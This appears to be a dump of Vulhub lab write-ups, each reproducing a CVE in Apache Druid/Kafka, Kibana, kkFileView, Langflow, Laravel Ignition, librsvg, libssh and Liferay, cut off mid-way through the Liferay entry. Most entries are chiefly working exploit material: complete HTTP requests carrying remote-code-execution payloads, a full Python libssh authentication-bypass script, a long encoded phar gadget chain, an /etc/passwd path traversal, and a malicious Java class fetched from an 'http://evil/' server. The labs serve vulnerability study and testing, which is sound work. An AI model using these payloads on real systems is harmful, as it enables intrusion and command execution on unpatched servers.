In the version prior to 3.3.2, there is a JNDI injection issue in the Apache Kafka clients if an attacker is able to set the sasl.jaas.config property for any of the connector's Kafka clients to com.sun.security.auth.module.JndiLoginModule. It will allow the server to connect to the attacker's LDAP server and deserialize the LDAP response, which the attacker can use to execute java deserialization gadget chains on the Kafka connect server. Attacker can cause unrestricted deserialization of untrusted data (or) RCE vulnerability when there are gadgets in the classpath.

Because this issue exists in a Java library, we have to find a real world software that is using the kafka-clients.

This software is Apache Druid, which is depended on kafka-clients to connect to one of its datasources. This guide is demonstrates how to exploit CVE-2023-25194 in the Apache Druid server.

References:
<https://nvd.nist.gov/vuln/detail/CVE-2023-25194
<https://github.com/projectdiscovery/nuclei-templates/blob/5d90e8275084b0ae9166ec38cacd22e5a5a94fb8/http/vulnerabilities/apache/apache-druid-kafka-connect-rce.yaml
<https://hackerone.com/reports/1529790

Vulnerable Environment

Execute following command to start a Apache Druid server 25.0.0 which is depended on kafka-clients 3.3.1:


docker compose up -d


After server is started, you can see the home page of Apache Druid on http://your-ip:8888.

Exploit

For vulnerability exploitation, you can use Java Chains. First, follow the Quick Start guide to set up Java Chains. Then, refer to the JNDI Basic Exploitation Guide and following screenshot to configure the command id /tmp/success, generate a JNDI LDAP URL Payload that will be used in the attack.



Paste the evil LDAP url into following request and send it:


POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
Host: your-ip:8888
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 1405

{
    ""type"":""kafka"",
    ""spec"":{
        ""type"":""kafka"",
        ""ioConfig"":{
            ""type"":""kafka"",
            ""consumerProperties"":{
                ""bootstrap.servers"":""127.0.0.1:6666"",
                ""sasl.mechanism"":""SCRAM-SHA-256"",
                ""security.protocol"":""SASL_SSL"",
                ""sasl.jaas.config"":""com.sun.security.auth.module.JndiLoginModule required user.provider.url=\""ldap://java-chains:50389/x\"" useFirstPass=\""true\"" serviceName=\""x\"" debug=\""true\"" group.provider.url=\""xxx\"";""
            },
            ""topic"":""test"",
            ""useEarliestOffset"":true,
            ""inputFormat"":{
                ""type"":""regex"",
                ""pattern"":""([\\s\\S]*)"",
                ""listDelimiter"":""56616469-6de2-9da4-efb8-8f416e6e6965"",
                ""columns"":[
                    ""raw""
                ]
            }
        },
        ""dataSchema"":{
            ""dataSource"":""sample"",
            ""timestampSpec"":{
                ""column"":""!!!nosuchcolumn!!!"",
                ""missingValue"":""1970-01-01T00:00:00Z""
            },
            ""dimensionsSpec"":{

            },
            ""granularitySpec"":{
                ""rollup"":false
            }
        },
        ""tuningConfig"":{
            ""type"":""kafka""
        }
    },
    ""samplerConfig"":{
        ""numRows"":500,
        ""timeoutMs"":15000
    }
}




As you can see, id /tmp/success was executed successfully:
-------------------------------------------------------------------------------","https://nvd.nist.gov/vuln/detail/CVE-2023-25194
https://github.com/projectdiscovery/nuclei-templates/blob/5d90e8275084b0ae9166ec38cacd22e5a5a94fb8/http/vulnerabilities/apache/apache-druid-kafka-connect-rce.yaml
https://hackerone.com/reports/1529790"
kibana,CVE-2019-7609,Kibana Prototype Pollution Leads to Remote Code Execution (CVE-2019-7609),"Kibana Prototype Pollution Leads to Remote Code Execution (CVE-2019-7609)

中文版本(Chinese version)

Kibana is an open source data visualization dashboard for Elasticsearch.

Kibana versions before 5.6.15 and 6.6.1 contain an arbitrary code execution flaw in the Timelion visualizer. An attacker with access to the Timelion application could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.

References:
https://nvd.nist.gov/vuln/detail/CVE-2019-7609
https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/
https://slides.com/securitymb/prototype-pollution-in-kibana/#/4

Setup

Before you can setup the environment, you need to change vm.maxmapcount to greater than 262144 in host server (not in the docker container):


sysctl -w vm.maxmapcount=262144


Then, start the Kibana 6.5.4 and Elasticsearch 6.8.6:


docker compose up -d


Vulnerability Reproduce

After started the environment, the Kibana is listening on http://your-ip:5106. The prototype pollution is happens in Timeline visualizer, fill in following payload here:


.es(*).props(label.proto.env.AAAA='require(""child_process"").exec(""/bin/touch /tmp/success"");process.exit()//')
.props(label.proto.env.NODE_OPTIONS='--require /proc/self/environ')




Then, visit ""Canvas"" page to trigger the command /bin/touch /tmp/success. The file /tmp/success is created successfully:
-------------------------------------------------------------------------------","https://nvd.nist.gov/vuln/detail/CVE-2019-7609
https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/
https://slides.com/securitymb/prototype-pollution-in-kibana/#/4"
kibana,CVE-2020-7012,Kibana 7.6.2 upgrade-assistant-telemetry Prototype Pollution Leads to RCE (CVE-2020-7012),"Kibana 7.6.2 upgrade-assistant-telemetry Prototype Pollution Leads to RCE (CVE-2020-7012)

中文版本(Chinese version)

Kibana is an open source data visualization dashboard for Elasticsearch.

Kibana versions between 6.7.0 to 6.8.8 and 7.0.0 to 7.6.2 contain a prototype pollution flaw in the Upgrade Assistant. An authenticated attacker with privileges to write to the Kibana index could insert data that would cause Kibana to execute arbitrary code. This could possibly lead to an attacker executing code with the permissions of the Kibana process on the host system.

References:
<https://hackerone.com/reports/852613
<https://discuss.elastic.co/t/elastic-stack-6-8-9-and-7-7-0-security-update/235571

Setup

Start Kibana 7.6.2 and Elasticsearch 7.6.2 using Docker:

bash
docker compose up -d


Once the environment is running, Kibana will be accessible at http://your-ip:5601.

Vulnerability Reproduction

The remote code execution occurs when Kibana reading the upgrade-assistant-telemetry attribute of the saved object from Elasticsearch. So you can exploit this vulnerability by sending data directly to Elasticsearch or submitting queries through Kibana. Execution will occur either after Kibana is restarted or when data collection takes place (at an unknown time).

To reproduce the vulnerability, first go to the developer tools of the Kibana UI (the URL is http://your-ip:5601/app/kibana#/dev_tools/console), then send the following request to modify Kibana mappings to allow the custom upgrade-assistant-telemetry document:

json
PUT /.kibana1/mappings
{
  ""properties"": {
    ""upgrade-assistant-telemetry"": {
      ""properties"": {
        ""constructor"": {
          ""properties"": {
            ""prototype"": {
              ""properties"": {
                ""sourceURL"": {
                  ""type"": ""text"",
                  ""fields"": {
                    ""keyword"": {
                      ""type"": ""keyword"",
                      ""ignore_above"": 256
                    }
                  }
                }
              }
            }
          }
        },
        ""features"": {
          ""properties"": {
            ""deprecation_logging"": {
              ""properties"": {
                ""enabled"": {
                  ""type"": ""boolean"",
                  ""null_value"": true
                }
              }
            }
          }
        },
        ""ui_open"": {
          ""properties"": {
            ""cluster"": {
              ""type"": ""long"",
              ""null_value"": 0
            },
            ""indices"": {
              ""type"": ""long"",
              ""null_value"": 0
            },
            ""overview"": {
              ""type"": ""long"",
              ""null_value"": 0
            }
          }
        },
        ""ui_reindex"": {
          ""properties"": {
            ""close"": {
              ""type"": ""long"",
              ""null_value"": 0
            },
            ""open"": {
              ""type"": ""long"",
              ""null_value"": 0
            },
            ""start"": {
              ""type"": ""long"",
              ""null_value"": 0
            },
            ""stop"": {
              ""type"": ""long"",
              ""null_value"": 0
            }
          }
        }
      }
    }
  }
}


Then send the second request to inject the malicious telemetry document:

json
PUT /.kibana1/doc/upgrade-assistant-telemetry:upgrade-assistant-telemetry
{
  ""upgrade-assistant-telemetry"": {
    ""ui_open.overview"": 1,
    ""ui_open.cluster"": 1,
    ""ui_open.indices"": 1,
    ""constructor.prototype.sourceURL"": ""\u2028\u2029\nglobal.process.mainModule.require('child_process').exec('touch /tmp/success')""
  },
  ""type"": ""upgrade-assistant-telemetry"",
  ""updated_at"": ""2020-04-17T20:47:40.800Z""
}




Finally, you need to wait for a while for your payload to execute. If you don't want to wait, you can restart the Kibana server by docker compose restart kibana, and the malicious code will be executed after the service restarts.

As you can see, touch /tmp/success will be executed after the service restarts:



Important note: After the exploitation, Kibana will crash and not able to start. You have to delete the .kibana_1 index from ElasticSearch to restore the functionality.
-------------------------------------------------------------------------------","https://hackerone.com/reports/852613
https://discuss.elastic.co/t/elastic-stack-6-8-9-and-7-7-0-security-update/235571"
kibana,CVE-2018-17246,Kibana Local File Inclusion (CVE-2018-17246),"Kibana Local File Inclusion (CVE-2018-17246)

中文版本(Chinese version)

Kibana is an open source data visualization dashboard for Elasticsearch.

Kibana versions before 6.4.3 and 5.6.13 contain an arbitrary file inclusion flaw in the Console plugin. An attacker with access to the Kibana Console API could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.

References:
<https://nvd.nist.gov/vuln/detail/CVE-2018-17246
<https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/

Environment Setup

Start the Kibana 5.6.12 and Elasticsearch 5.6.16:


docker compose up -d


After started the environment, the Kibana is listening on http://your-ip:5106.

Vulnerability Reproduction

Send the following request to trigger a basic path traversal:


http://your-ip:5601/api/console/apiserver?senseversion=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd


Though there is nothing response except a error message with the 500 status code, you can see the exception in the docker compose logs:



File /etc/passwd is imported successfully.

To exploit this vulnerability, you need to upload a JavaScript webshell to the machine where the Kibana is running, then include it.

js
// docker compose exec kibana bash && echo '...code...' /tmp/vulhub.js
export default {asJson: function() {return require(""child_process"").execSync(""id"").toString()}}
-------------------------------------------------------------------------------","https://nvd.nist.gov/vuln/detail/CVE-2018-17246
https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/"
kkfileview,Unknown,kkFileView ZipSlip Remote Code Execution,"kkFileView ZipSlip Remote Code Execution

中文版本(Chinese version)

kkFileView is an open source document online preview solution.

In the version prior to 4.4.0-beta, kkFileView has a ZipSlip issue. Attackers can use this issue to upload arbitrary files to the server and execute code.

References:
<https://github.com/luelueking/kkFileView-v4.3.0-RCE-POC

Vulnerable environment

Execute following command to start a kkFileView 3.4.0:


docker compose up -d


After the server is started, you can see the index page at http://your-ip:8012.

Exploit

First, generate a craft POC by poc.py:


python poc.py


A test.zip file will be written.

Upload test.zip and the sample.odt to the kkFileView server:



Then, click the ""preview"" button of test.zip, the zip file will be listed:



Finally, click the ""preview"" button of sample.odt.

You can see the touch /tmp/success has been executed successful:
-------------------------------------------------------------------------------",https://github.com/luelueking/kkFileView-v4.3.0-RCE-POC
langflow,CVE-2025-3248,Langflow validate/code API Pre-Auth Remote Code Execution (CVE-2025-3248),"Langflow validate/code API Pre-Auth Remote Code Execution (CVE-2025-3248)

中文版本(Chinese version)

Langflow is a popular open-source tool for building agentic AI workflows, providing a Python-based web interface to visually construct AI-driven agents and pipelines.

A critical unauthenticated remote code execution vulnerability (CVE-2025-3248) exists in Langflow prior to version 1.3.0. An vulnerable endpoint (/api/v1/validate/code) attempts to validate user-submitted Python code by parsing it with the ast module and executing any function definitions using exec. However, Python decorators and default argument expressions are also executed at function definition time, making it possible to inject arbitrary code via these features.

Attackers can exploit this issue by sending a specially crafted function definition with a malicious decorator or default argument, resulting in code execution as the server user.

References:
<https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/
<https://github.com/langflow-ai/langflow/releases/tag/1.3.0
<https://github.com/langflow-ai/langflow/pull/6911

Environment Setup

Execute the following command to start a Langflow 1.2.0 server:


docker compose up -d


After the server starts, the Langflow web interface will be available at http://your-ip:7860. You can login with the default credentials administrator:vulhub.

Vulnerability Reproduction

To reproduce the vulnerability, you can send a POST request to the /api/v1/validate/code endpoint with a malicious Python function definition. For example, the following payload will execute id command on the server using a decorator:


POST /api/v1/validate/code HTTP/1.1
Host: your-ip:7860
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 105

{""code"": ""@exec(\""raise Exception(import('subprocess').check_output(['id']))\"")\ndef foo():\n  pass""}
-------------------------------------------------------------------------------","https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/
https://github.com/langflow-ai/langflow/releases/tag/1.3.0
https://github.com/langflow-ai/langflow/pull/6911"
laravel,CVE-2021-3129,Laravel Ignition 2.5.1 Remote Code Execution (CVE-2021-3129),"Laravel Ignition 2.5.1 Remote Code Execution (CVE-2021-3129)

中文版本(Chinese version)

Laravel is a free, open-source PHP web framework created by Taylor Otwell. Ignition before 2.5.2, as used in Laravel and other products, allows unauthenticated remote attackers to execute arbitrary code because of insecure usage of filegetcontents() and fileputcontents(). This is exploitable on sites using debug mode with Laravel before 8.4.2.

Reference links:
https://www.ambionics.io/blog/laravel-debug-rce
https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g

Environment Setup

Execute the following command to start an application running Laravel 8.4.2 and Ignition 2.5.1:


docker compose up -d


After the environment is started, visit http://your-ip:8080 to see Laravel's default welcome page.

Vulnerability Reproduce

First, we send the following request. If an Ignition error page appears, it indicates that the vulnerability exists and debug mode is enabled:



Then, we follow these steps to reproduce the vulnerability:

1, Send the following request to clear the original log file:


POST /_ignition/execute-solution HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 328

{
  ""solution"": ""Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"",
  ""parameters"": {
    ""variableName"": ""username"",
    ""viewFile"": ""php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log""
  }
}


2, Generate a serialized POC using phpggc:


php -d ""phar.readonly=0"" ./phpggc Laravel/RCE5 ""phpinfo();"" --phar phar -o php://output | base64 -w 0 | python -c ""import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())""


3, Send the following request to add a prefix to the Log:


POST /_ignition/execute-solution HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 163

{
  ""solution"": ""Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"",
  ""parameters"": {
    ""variableName"": ""username"",
    ""viewFile"": ""AA""
  }
}


4, Send the request with POC as viewFile value:


POST /_ignition/execute-solution HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 5058

{
  ""solution"": ""Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"",
  ""parameters"": {
    ""variableName"": ""username"",
    ""viewFile"": ""=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=6F=00=66=00=41=00=67=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=44=00=49=00=41=00=51=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=79=00=4E=00=54=00=6F=00=69=00=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=63=00=47=00=68=00=77=00=61=00=57=00=35=00=6D=00=62=00=79=00=67=00=70=00=4F=00=79=00=42=00=6C=00=65=00=47=00=6C=00=30=00=4F=00=79=00=41=00=2F=00=50=00=69=00=49=00=37=00=66=00=58=00=31=00=39=00=42=00=51=00=41=00=41=00=41=00=47=00=52=00=31=00=62=00=57=00=31=00=35=00=42=00=41=00=41=00=41=00=41=00=4C=00=71=00=2F=00=42=00=57=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4C=00=59=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=4C=00=71=00=2F=00=42=00=57=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4C=00=59=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=48=00=52=00=6C=00=63=00=33=00=52=00=64=00=30=00=6B=00=2F=00=31=00=70=00=52=00=49=00=71=00=57=00=72=00=36=00=77=00=46=00=6C=00=38=00=30=00=4D=00=2B=00=48=00=4B=00=2B=00=57=00=61=00=63=00=4E=00=67=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00""
  }
}


5, Send the following request to clean up the Log file:


POST /_ignition/execute-solution HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 299

{
  ""solution"": ""Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"",
  ""parameters"": {
    ""variableName"": ""username"",
    ""viewFile"": ""php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log""
  }
}


This step may encounter exceptions, resulting in failure to properly clean up the Log file. If this happens, you can try again from step 1.

6, Use phar:// for deserialization to execute arbitrary code:


POST /_ignition/execute-solution HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 210

{
  ""solution"": ""Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"",
  ""parameters"": {
    ""variableName"": ""username"",
    ""viewFile"": ""phar:///var/www/storage/logs/laravel.log/test.txt""
  }
}


Note that an absolute path must be used at this point.

As you can see, PHPINFO has been successfully executed:
-------------------------------------------------------------------------------","https://www.ambionics.io/blog/laravel-debug-rce
https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g"
librsvg,CVE-2023-38633,Librsvg XInclude Arbitrary file reading (CVE-2023-38633),"Librsvg XInclude Arbitrary file reading (CVE-2023-38633)

中文版本(Chinese version)

Librsvg is a free software SVG rendering library written as part of the GNOME project, intended to be lightweight and portable.

A directory traversal problem in the URL decoder of librsvg before 2.56.3 could be used by local or remote attackers to disclose files (on the local filesystem outside of the expected area), as demonstrated by href="".?../../../../../../../../../../etc/passwd in an xi:include element.

References:
<https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/
<https://gitlab.gnome.org/GNOME/librsvg/-/issues/996

Vulnerable Environment

Executing following command to start a PHP server that uses librsvg 2.50.7 to handle SVG images:


docker compose up -d


After the server is started, browse http://your-ip:8080 to see the upload page.

Exploit

Use <xi:includeto read the local file by this POC:

xml
<?xml version=""1.0"" encoding=""UTF-8"" standalone=""no""?
<svg width=""300"" height=""300"" xmlns:xi=""http://www.w3.org/2001/XInclude""
  <rect width=""300"" height=""300"" style=""fill:rgb(255,255,255);"" /
  <text x=""10"" y=""100""
    <xi:include href="".?../../../../../../../../../../etc/passwd"" parse=""text"" encoding=""UTF-8""
      <xi:fallbackfile not found</xi:fallback
    </xi:include
  </text
</svg


Upload this SVG image to server, you will see the /etc/passwd that is embedded in the output image:
-------------------------------------------------------------------------------","https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/
https://gitlab.gnome.org/GNOME/librsvg/-/issues/996"
libssh,CVE-2018-10933,libssh Authentication Bypass Vulnerability(CVE-2018-10933),"libssh Authentication Bypass Vulnerability(CVE-2018-10933)

中文版本(Chinese version)

libssh is a multiplatform C library implementing the SSHv2 protocol on client and server side. A logic vulnerability was found in libssh's server-side state machine. The attacker can send the MSGUSERAUTHSUCCESS message before the authentication succeed. That can bypass the authentication and access the target SSH server.

References:
https://www.libssh.org/security/advisories/CVE-2018-10933.txt
https://www.seebug.org/vuldb/ssvid-97614

Setup

Start the environment:


docker compose up -d


After the environment is started, we can connect the your-ip:2222 port (account password: myuser:mypassword), which is a legal ssh login:



Exploit

Referring to the POC given in https://www.seebug.org/vuldb/ssvid-97614, we can use the following script to proof the vulnerability.

python
!/usr/bin/env python3
import sys
import paramiko
import socket
import logging

logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)
bufsize = 2048


def execute(hostname, port, command):
    sock = socket.socket()
    try:
        sock.connect((hostname, int(port)))

        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()

        message.addbyte(paramiko.common.cMSGUSERAUTH_SUCCESS)
        transport.sendmessage(message)

        client = transport.open_session(timeout=10)
        client.exec_command(command)

        # stdin = client.makefile(""wb"", bufsize)
        stdout = client.makefile(""rb"", bufsize)
        stderr = client.makefile_stderr(""rb"", bufsize)

        output = stdout.read()
        error = stderr.read()

        stdout.close()
        stderr.close()

        return (output+error).decode()
    except paramiko.SSHException as e:
        logging.exception(e)
        logging.debug(""TCPForwarding disabled on remote server can't connect. Not Vulnerable"")
    except socket.error:
        logging.debug(""Unable to connect."")

    return None


if name == 'main':
    print(execute(sys.argv[1], sys.argv[2], sys.argv[3]))



You can execute arbitrary commands on the target server like following:
-------------------------------------------------------------------------------","https://www.libssh.org/security/advisories/CVE-2018-10933.txt
https://www.seebug.org/vuldb/ssvid-97614
https://www.seebug.org/vuldb/ssvid-97614,"
liferay-portal,CVE-2020-7961,Liferay Portal CE Deserialization Remote Code Execution (CVE-2020-7961),"Liferay Portal CE Deserialization Remote Code Execution (CVE-2020-7961)

中文版本(Chinese version)

Liferay Portal CE is an open-source platform for rapid website development. Versions 7.2.0 GA1 and earlier contain a deserialization vulnerability in the API interface, allowing attackers to execute arbitrary commands on the target server via crafted requests.

References:
<https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html
<https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Liferay%20Portal%20CVE-2020-7961%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/
<https://xz.aliyun.com/t/7499
<https://xz.aliyun.com/t/7485

Environment Setup

Execute the following command to start Liferay Portal 7.2.0 GA1:


docker compose up -d


After the container starts, visit http://your-ip:8080 to access the default homepage. If the server fails to start, ensure your system has at least 2GB of memory.

Vulnerability Reproduction

First, create and compile a malicious Java class:

java
// javac LifExp.java
public class LifExp {
    static {
        try {
            String[] cmd = {""bash"", ""-c"", ""touch /tmp/success""};
            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}


Start an HTTP file server in the directory containing the class file:


$ ls
LifExp.class  LifExp.java

$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


Because the target uses a high Java version, use the com.mchange.v2.c3p0.WrapperConnectionPoolDataSource gadget chain. Generate a Jackson-compatible payload with marshalsec:


java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Jackson C3P0WrapperConnPool http://evil/ LifExp


Here, http://evil/ is the address of your HTTP server, and LifExp is the malicious class name.



Modify the generated payload to match Liferay Portal's format (+parametername:classname=value):
